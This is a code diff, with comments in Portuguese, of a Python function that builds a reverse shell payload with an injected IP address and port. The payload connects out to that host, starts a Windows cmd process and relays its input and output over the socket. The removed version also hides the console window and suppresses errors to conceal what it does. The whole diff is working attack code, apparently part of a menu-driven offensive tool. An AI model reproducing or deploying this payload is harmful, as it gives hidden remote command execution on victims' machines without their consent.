@@ -14,113 +14,35 @@ def gerar_reverse_shell(ip_destino, porta_destino):
   
     # O código do shell reverso com as variáveis injetadas
     shell_code = f"""
-import os
-import socket
-import subprocess
-import threading
-import sys
-import platform
-import time # Necessário para o loop de espera
-
-import ctypes
-
-if platform.system() == "Windows":
-    # Obtém o identificador da janela do console (se existir)
-    # A função GetConsoleWindow retorna 0 se não houver console.
-    janela_console = ctypes.windll.kernel32.GetConsoleWindow()
-    if janela_console != 0:
-        # Usa ShowWindow (SW_HIDE = 0) para esconder a janela
-        ctypes.windll.user32.ShowWindow(janela_console, 0)
-
-
-try:
-    from subprocess import CREATE_NO_WINDOW
-except ImportError:
-    # Valor literal de 0x08000000 (para Python < 3.7)
-    CREATE_NO_WINDOW = 134217728 
-
-# --- CONFIGURAÇÃO ---
-# IP e PORTA INJETADOS AQUI PELO SCRIPT GERADOR
-ip="{ip_destino}"
-port={porta_destino}
-
-# Configuração de ocultamento de janela para o processo CMD (Windows)
-startupinfo = None
-if platform.system() == "Windows":
-    startupinfo = subprocess.STARTUPINFO()
-    # Adiciona o flag para não criar janela de console
-    startupinfo.dwFlags |= CREATE_NO_WINDOW
-
-
-# --- FUNÇÕES DE COMUNICAÇÃO ---
-
+import os,socket,subprocess,threading;
 def s2p(s, p):
-    # Lê do socket (s) e escreve no stdin do processo (p)
     while True:
-        try:
-            data = s.recv(1024)
-            if len(data) > 0:
-                p.stdin.write(data)
-                p.stdin.flush()
-            else:
-                break # Conexão fechada
-        except:
-            break
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
 
 def p2s(s, p):
-    # Lê do stdout do processo (p) e envia para o socket (s)
     while True:
-        try:
-            # Ler byte a byte pode ser lento, mas garante que o prompt seja enviado corretamente
-            s.send(p.stdout.read(1))
-        except:
-            break
+        s.send(p.stdout.read(1))
 
-# --- INÍCIO DA CONEXÃO E EXECUÇÃO ---
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{ip_destino}",{porta_destino}))
 
-s = None
+p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
 try:
-    # 1. Tenta estabelecer a conexão
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, port))
-
-    # 2. Inicia o processo CMD (ou shell no Linux), usando startupinfo para ocultar
-    p = subprocess.Popen(["cmd"],
-                       stdout=subprocess.PIPE,
-                       stderr=subprocess.STDOUT,
-                       stdin=subprocess.PIPE,
-                       startupinfo=startupinfo # OCULTA o CMD no Windows
-                      )
-
-    # 3. Cria e inicia as threads de comunicação
-    s2p_thread = threading.Thread(target=s2p, args=[s, p])
-    s2p_thread.daemon = True # Permite que a thread morra se o programa principal sair
-    s2p_thread.start()
-
-    p2s_thread = threading.Thread(target=p2s, args=[s, p])
-    p2s_thread.daemon = True
-    p2s_thread.start()
-    
-    # 4. Loop de espera para manter o processo principal vivo
-    # O processo principal (o .exe) não chama p.wait(), permitindo que o console feche.
-    # O loop mantém o processo principal ativo enquanto as threads de comunicação estiverem rodando.
-    while s2p_thread.is_alive() and p2s_thread.is_alive():
-        time.sleep(0.5)
-
-except ConnectionRefusedError:
-    # Não faz nada se a conexão for recusada
-    pass
-except Exception:
-    # Não faz nada para falhas de socket ou outras exceções
-    pass
-finally:
-    # 5. Garante que todos os recursos sejam fechados
-    if 's' in locals() and s is not None and not s._closed:
-        s.close()
-    
-    # Tenta terminar o processo filho se ele ainda estiver rodando
-    if 'p' in locals() and p is not None and p.poll() is None:
-        p.terminate()
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
 """
     
     # Define o nome do arquivo (será criado na raiz do projeto, junto ao menu.py)
